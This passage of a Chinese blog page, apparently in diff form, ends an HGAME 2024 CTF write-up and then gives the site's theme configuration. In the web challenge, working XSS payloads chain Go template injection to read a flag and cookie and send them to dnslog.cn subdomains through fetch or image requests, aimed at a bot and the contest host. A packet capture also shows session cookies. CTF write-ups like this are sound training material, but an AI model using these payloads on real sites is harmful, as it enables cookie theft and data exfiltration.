class="subst">$&#123;contentWithinBraces&#125;</span>.crg9yr.dnslog.cn/`</span>, &#123; <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;); &#125;&#125;)))</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对Payload进行URL编码，本地回显flag成功：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//127.0.0.1:8080/?tmpl=&#123;&#123;.Query%20.RemoteIP&#125;&#125;&amp;127.0.0.1=%3Cscript%3Efetch(%22http://127.0.0.1:8080?tmpl=&#123;&#123;.Query%20.Request.Method%20|%20.GetHeader&#125;&#125;&amp;GET=Cookie%22).then(response%20=%3E%20response.text()).then(t%20=%3E%20&#123;const%20matched%20=%20t.match(/\%7B([^&#125;]+)\%7D/);%20let%20contentWithinBraces%20=%20%22%22;%20if%20(matched)%20&#123;contentWithinBraces%20=%20matched[1];&#125;document.body.innerHTML%20+=%20\`%3Cimg%20src=%22http://\$&#123;contentWithinBraces&#125;.lavbls.dnslog.cn/%22%20style=%22display:none;%22%3E\`;&#125;).catch(error%20=%3E%20console.error(%27Error:%27,%20error));%3C/script%3E</span></span><br></pre></td></tr></table></figure>
+
+<p>本地bot打通脚本：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//127.0.0.1:8080/bot?url=http%3A//127.0.0.1%3A8080/%3Ftmpl%3D%7B%7B.Query%2520.RemoteIP%7D%7D%26127.0.0.1%3D%253Cscript%253E%250Afetch%28%2522/flag%2522%29.then%28_%2520%253D%253E%2520fetch%28%2522http%253A//127.0.0.1%253A8080%3Ftmpl%253D%257B%257B.Query%2520.Request.Method%2520%257C%2520.GetHeader%257D%257D%2526GET%253DCookie%2522%29.then%28r%2520%253D%253E%2520r.text%28%29.then%28t%2520%253D%253E%2520%257Bconst%2520matched%2520%253D%2520t.match%28%252F%255C%25257B%28%255B%255E%257D%5D%252B%29%255C%25257D%252F%29%253B%2520if%2520%28matched%29%2520%257B%2520let%2520contentWithinBraces%2520%253D%2520matched%255B1%255D%253B%2520fetch%28%2560http%253A//%2524%257BcontentWithinBraces%257D.53n4ij.dnslog.cn/%2560%252C%2520%257B%2520mode%253A%2520%2527no-cors%2527%2520%257D%29%253B%2520%257D%257D%29%29%29%250A%253C/script%253E</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>靶机Payload：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">http</span>:<span class="comment">//106.14.57.14:31418/bot?url=http%3A//127.0.0.1%3A8080/%3Ftmpl%3D%7B%7B.Query%2520.RemoteIP%7D%7D%26127.0.0.1%3D%253Cscript%253E%250Afetch%28%2522/flag%2522%29.then%28_%2520%253D%253E%2520fetch%28%2522http%253A//127.0.0.1%253A8080%3Ftmpl%253D%257B%257B.Query%2520.Request.Method%2520%257C%2520.GetHeader%257D%257D%2526GET%253DCookie%2522%29.then%28r%2520%253D%253E%2520r.text%28%29.then%28t%2520%253D%253E%2520%257Bconst%2520matched%2520%253D%2520t.match%28%252F%255C%25257B%28%255B%255E%257D%5D%252B%29%255C%25257D%252F%29%253B%2520if%2520%28matched%29%2520%257B%2520let%2520contentWithinBraces%2520%253D%2520matched%255B1%255D%253B%2520fetch%28%2560http%253A//%2524%257BcontentWithinBraces%257D.53n4ij.dnslog.cn/%2560%252C%2520%257B%2520mode%253A%2520%2527no-cors%2527%2520%257D%29%253B%2520%257D%257D%29%29%29%250A%253C/script%253E</span></span><br></pre></td></tr></table></figure>
+
+<p>flag:<code>hgame&#123;13fc4a24aef77869dfad2d7ebe87012a9ba3b185&#125;</code></p>
+<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="ek1ng-want-girlfriend"><a href="#ek1ng-want-girlfriend" class="headerlink" title="ek1ng_want_girlfriend"></a><strong>ek1ng_want_girlfriend</strong></h3><p>使用wireshark查看pcapng数据包，发现有一个访问ek1ng.jpg的请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/ek1ng.jpg</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:8000</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not A(Brand&quot;;v=&quot;99&quot;, &quot;Microsoft Edge&quot;;v=&quot;121&quot;, &quot;Chromium&quot;;v=&quot;121&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>vscode-cli-secret-half=SyTljllpVsfR7KjkthlrtwmH0oISE36mBhuGl9Eeljg=; vscode-tkn=a3a8bb45-6be0-4cd8-9d77-3b26f5aa384a</span><br><span class="line"></span><br><span class="line"><span class="language-yaml"><span class="string">HTTP/1.0</span> <span class="number">200</span> <span class="string">OK</span></span></span><br><span class="line"><span class="language-yaml"><span class="attr">Server:</span> <span class="string">SimpleHTTP/0.6</span> <span class="string">Python/3.8.10</span></span></span><br><span class="line"><span class="language-yaml"><span class="attr">Date:</span> <span class="string">Mon,</span> <span class="number">05</span> <span class="string">Feb</span> <span class="number">2024 02:49:44 </span><span class="string">GMT</span></span></span><br><span class="line"><span class="language-yaml"><span class="attr">Content-type:</span> <span class="string">image/jpeg</span></span></span><br><span class="line"><span class="language-yaml"><span class="attr">Content-Length:</span> <span class="number">2487021</span></span></span><br><span class="line"><span class="language-yaml"><span class="attr">Last-Modified:</span> <span class="string">Mon,</span> <span class="number">05</span> <span class="string">Feb</span> <span class="number">2024 02:46:19 </span><span class="string">GMT</span></span></span><br><span class="line"><span class="language-yaml"><span class="string">（图片二进制正文）</span></span></span><br></pre></td></tr></table></figure>
+
+<p>保存为jpg格式图片，用010editor打开，搜索FF D8 FF并将前面的字节全部删去，就可以得到ek1ng学长的图片了</p>
+<p><img src="C:\Users\24993\Desktop\ek1ng.jpg"></p>
+<p>flag:<code>hgame&#123;ek1ng_want_girlfriend_qq_761042182&#125;</code></p>
+
+                
+                <p class="end">__END__</p>
+            </div>
+            <div class="article-footer">
+                <div class="suffix-box">
+    <div class="suffix-box-left">
+        <img src="/image/sidebar/avatar.jpg" alt="Ec3o">
+    </div>
+    <div class="suffix-box-right">
+        <span class="suffix-box-title">文章作者：</span>Ec3o
+        <br>
+        <span class="suffix-box-title">文章出处：</span><a href="/2024/02/28/HGAME-2024-WEEK2-Writeup/" target="_blank">HGAME-2024-WEEK2-Writeup</a>
+        <br>
+        <span class="suffix-box-title">作者签名：</span>我将,点燃大海！
+        <br>
+        <span class="suffix-box-title">关于主题：</span><a href="https://github.com/first19326/Hexo-LiveForCode" target="_blank">Hexo - Live For Code</a>
+        <br>
+        <span class="suffix-box-title">版权声明：</span>文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/" title="BY-NC-SA" target="_blank">BY-NC-SA</a> 许可协议，转载请注明出处
+        <br>
+    </div>
+    <div style="clear: both;"></div>
+</div>
+                
+                
+                <div class="article-prev-next">
+                    
+                        <a href="/2024/02/28/HGAME-2024-WEEK3-Writeup/" class="prev-prefix">« </a> 上一篇：    <a href="/2024/02/28/HGAME-2024-WEEK3-Writeup/" title="发布于 2024-02-28 10:40">HGAME-2024-WEEK3-Writeup</a>
+                        <br>
+                    
+                    
+                        <a href="/2024/02/28/HGAME-2024-WEEK1-Writeup/" class="next-prefix">» </a> 下一篇：    <a href="/2024/02/28/HGAME-2024-WEEK1-Writeup/" title="发布于 2024-02-28 10:30">HGAME-2024-WEEK1-Writeup</a>
+                    
+                </div>
+            </div>
+            
+    <div class="article-comments">
+        
+            <div class="comments-title">
+                评论列表
+            </div>
+        
+        <div class="comments-content"></div>
+    </div>
+    
+ 
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>我将，点燃大海</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/image/sidebar/avatar.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="ec3o.github.io" target="_blank"><span>Ec3o</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/donate" class="" target="_self"><span class="iconfont icon-heart-fill"></span>赞赏</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="知乎" href="https://zhihu.com/people/worstone-29" class="" target="_blank" data=""><span class="iconfont icon-zhihu"></span></a>
+                
+                    <a name="微博" href="https://weibo.com/u/5749847477" class="" target="_blank" data=""><span class="iconfont icon-weibo"></span></a>
+                
+                    <a name="QQ" href="javascript:;" class="image" target="_self" data="/image/sidebar/qq.png"><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="微信" href="javascript:;" class="" target="_self" data=""><span class="iconfont icon-wechat"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/Ec3o" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="1980102173" lrcshow="true" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "Ec3o",
+        GitHubRepositories : "Ec3o.github.io",
+
+        User             : "Ec3o",
+        UserAvatar       : "/image/sidebar/avatar.jpg",
+        WebsiteStartDate : "2020-01-01",
+        Home             : "ec3o.github.io",
+
+        WebsiteTitleBlur         : "(◍´꒳`◍) Hi, Live For Code",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/image/website/logo/logo.png",
+            dark  : "/image/website/logo/logo-dark.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/image/header/home.jpg",
+            
+                "/image/header/home.jpeg",
+            
+                "/image/header/sky.jpg",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/image/header/article.jpg",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "我将，点燃大海",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "赞赏",
+                    icon   : "icon-heart-fill",
+                    href   : "/donate",
+                    type   : "donate",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "知乎",
+                        icon   : "icon-zhihu",
+                        href   : "https://zhihu.com/people/worstone-29",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "微博",
+                        icon   : "icon-weibo",
+                        href   : "https://weibo.com/u/5749847477",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "javascript:;",
+                        class  : "image",
+                        target : "_self",
+                        image  : "/image/sidebar/qq.png"
+                    },
+                
+                    {
+                        name   : "微信",
+                        icon   : "icon-wechat",
+                        href   : "javascript:;",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/Ec3o",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【人生若只如初见<span><i class='iconfont icon-like-fill'></i></span>何事秋风悲画扇】</div><div>&copy; 2020-2023 WorstOne. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "/image/donate/alipay.png",
+            wechat  : "/image/donate/wechat.png"
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Valine",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "天生我才必有用,散尽千金还复来",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "天生我才必有用,散尽千金还复来",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "1980102173", 
+            lrcshow  : true, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "我将,点燃大海！"
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
